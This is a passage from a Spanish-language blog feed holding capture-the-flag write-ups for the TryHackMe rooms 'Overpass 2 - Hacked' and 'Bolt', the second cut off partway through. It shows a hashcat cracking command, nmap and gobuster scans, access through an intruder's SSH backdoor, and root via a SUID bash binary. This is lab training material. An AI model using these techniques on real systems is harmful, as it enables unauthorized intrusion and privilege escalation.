&lt;p&gt;&lt;code&gt;Overpass 2 - Hacked&lt;/code&gt; es una serie de retos en los que incluyen Analisis de Trafico con Wireshark y Password Cracking, además una maquina que fue hackeada &lt;a href=&#34;https://tryhackme.com/room/overpass&#34;&gt;&lt;code&gt;Overpass&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;task-1&#34;&gt;TASK 1&lt;/h2&gt;
&lt;p&gt;En el &lt;code&gt;Task 1&lt;/code&gt; se pueden utilizar los siguientes filtros: &lt;code&gt;tcp.port == 4242&lt;/code&gt;, &lt;code&gt;http.request.method == GET&lt;/code&gt; y &lt;code&gt;http.request.method == POST&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;task-2&#34;&gt;TASK 2&lt;/h2&gt;
&lt;p&gt;En el &lt;code&gt;Task 2&lt;/code&gt; es necesario realizar un analisis del &lt;a href=&#34;https://github.com/NinjaJc01/ssh-backdoor&#34;&gt;&lt;strong&gt;Codigo del Backdoor&lt;/strong&gt;&lt;/a&gt; y Password Cracking, este ultimo lo realizamos con &lt;strong&gt;hashcat&lt;/strong&gt; utilizando &lt;code&gt;hashcat64.bin -m 1710 -a 0 hash:salt ../rockyou.txt&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;task-3&#34;&gt;TASK 3&lt;/h2&gt;
&lt;p&gt;A continuacion la solucion al Ultimo Task en el cual se ve envuelta la maquina que ha sido hackeada y con la ayuda del Task 1 y 2 podemos obtener acceso a la maquina.&lt;/p&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssh (2222 backdoor) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Aug 14 17:32:40 2020 as: nmap -sV -o mini_scan overpasstwo.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; overpasstwo.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.27.236&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
2222/tcp open  ssh     OpenSSH 8.2p1 Debian &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Aug 14 17:33:22 2020 -- 1 IP address (1 host up) scanned in 41.69 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/Screenshot_2020-08-14_16-54-29.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/overpass2$ gobuster dir -u http://overpasstwo.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/aboutus &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/downloads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/404.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;james---user&#34;&gt;JAMES - USER&lt;/h2&gt;
&lt;p&gt;En los Task 1 y 2 vemos que la persona que ingreso a la maquina dejo un backdoor, este backdoor esta a la escucha en el puerto 2222 el cual segun su codigo fuente solo espera por una contraseña para poder entrar en esta maquina utilizamos la contraseña crackeada, logramos obtener acceso a la maquina y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/Screenshot_2020-08-14_16-03-49.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion de archivos &lt;code&gt;SUID&lt;/code&gt; y encontramos el archivo &lt;code&gt;.suid_bash&lt;/code&gt;, al ejecutar este binario nos devuelve una shell con el mismo usuario (james).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/Screenshot_2020-08-14_17-05-11.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos que tipo de archivo con el parametro &lt;code&gt;--help&lt;/code&gt; y vemos que es &lt;code&gt;bash&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/Screenshot_2020-08-14_17-22-41.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/bash/#suid&#34;&gt;&lt;strong&gt;BASH - GTFOBins&lt;/strong&gt;&lt;/a&gt; para obtener una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/Screenshot_2020-08-14_17-06-53.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/overpasstwo/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/overpasstwo/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Bolt</title>
        <link>https://sckull.github.io/posts/bolt/</link>
        <pubDate>Thu, 13 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 13 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/bolt/</guid>
        <description>Bolt es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Bolt es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Bolt&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A hero is unleashed&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/0x9747&#34;&gt;0x9747&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y http (8000) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Aug 13 00:19:57 2020 as: nmap -sV -o mini_scan bolt.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bolt.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.172.52&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.27s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
8000/tcp open  http    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PHP 7.2.32-1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8/13%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5F34CDB2%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ge
SF:tRequest,1001,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2013\x20Aug\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:2020\x2005:20:48\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:blic,\x20s-maxage=600\r\nDate:\x20Thu,\x2013\x20Aug\x202020\x2005:20:48
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:n:\x20114ea1\r\n\r\n&amp;lt;!doctype\x20html&amp;gt;\n&amp;lt;html\x20lang=\&amp;#34;en-GB\&amp;#34;&amp;gt;\n\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20&amp;lt;head&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;meta\x20charset=\&amp;#34;u
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:tf-8\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;meta\x20name=\&amp;#34;viewport\&amp;#34;\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:content=\&amp;#34;width=device-width,\x20initial-scale=1\.0\&amp;#34;&amp;gt;\n\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;title&amp;gt;Bolt\x20\|\x20A
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20hero\x20is\x20unleashed&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;l
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ink\x20href=\&amp;#34;https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF::400,400i,700\&amp;#34;\x20rel=\&amp;#34;stylesheet\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/theme/base-2018/css/bulma\.css\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:?8ca0842ebb\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;styleshe
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:et\&amp;#34;\x20href=\&amp;#34;/theme/base-2018/css/theme\.css\?6cb66bfe9f\&amp;#34;&amp;gt;\n\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\t&amp;lt;meta\x20name=\&amp;#34;generator\&amp;#34;\x20content=\&amp;#34;Bolt\&amp;#34;&amp;gt;\n\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\t&amp;lt;link\x20rel=\&amp;#34;canonical\&amp;#34;\x20href=\&amp;#34;http://0\.0\.0\.0:8000/\&amp;#34;&amp;gt;\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:n\x20\x20\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20\x20\x20&amp;lt;body\x20class=\&amp;#34;front\&amp;#34;&amp;gt;\n\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20\x20\x20\x20\x20\x20\x20&amp;lt;a\x20&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FourOhFourRequest,16C3,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Thu,\x2013\x20Aug\x202020\x2005:
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20:50\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ust-revalidate\r\nDate:\x20Thu,\x2013\x20Aug\x202020\x2005:20:50\x20GMT
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x20561ff9\r\n\r\n&amp;lt;!doctype\x20html
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:&amp;gt;\n&amp;lt;html\x20lang=\&amp;#34;en\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;head&amp;gt;\n\x20\x20\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20&amp;lt;meta\x20charset=\&amp;#34;utf-8\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0&amp;lt;meta\x20name=\&amp;#34;viewport\&amp;#34;\x20content=\&amp;#34;width=device-width,\x20initial
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:-scale=1\.0\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20&amp;lt;title&amp;gt;Bolt\x20\|\x20A\x20hero\x20is\x20unleashed&amp;lt;/title&amp;gt;\n\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20\x20\x20\x20\x20&amp;lt;link\x20href=\&amp;#34;https://fonts\.googleapis\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:.com/css\?family=Bitter\|Roboto:400,400i,700\&amp;#34;\x20rel=\&amp;#34;stylesheet\&amp;#34;&amp;gt;\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\x20\x20\x20\x20\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20&amp;lt;link\x20rel=\&amp;#34;stylesheet\&amp;#34;\x20href=\&amp;#34;/theme/base-2018/css/them
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:e\.css\?6cb66bfe9f\&amp;#34;&amp;gt;\n\x20\x20\x20\x20\t&amp;lt;meta\x20name=\&amp;#34;generator\&amp;#34;\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0content=\&amp;#34;Bolt\&amp;#34;&amp;gt;\n\x20\x20\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20\x20\x20&amp;lt;body&amp;gt;\n\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20\x20\x20\x20\x20\x20\x20&amp;lt;a\x20href=\&amp;#34;#main-content\&amp;#34;\x20class=\&amp;#34;v
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:is&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Aug 13 00:21:16 2020 -- 1 IP address (1 host up) scanned in 78.40 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - PUERTO 80&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina de Apache en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200812_231929.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/bolt# gobuster dir -u http://bolt.thm -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-8000&#34;&gt;HTTP - PUERTO 8000&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200812_232410.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En las entradas de la pagina podemos leer algunos nombres de usuarios y contraseñas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200812_232702.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Segunda entrada&lt;br /&gt;
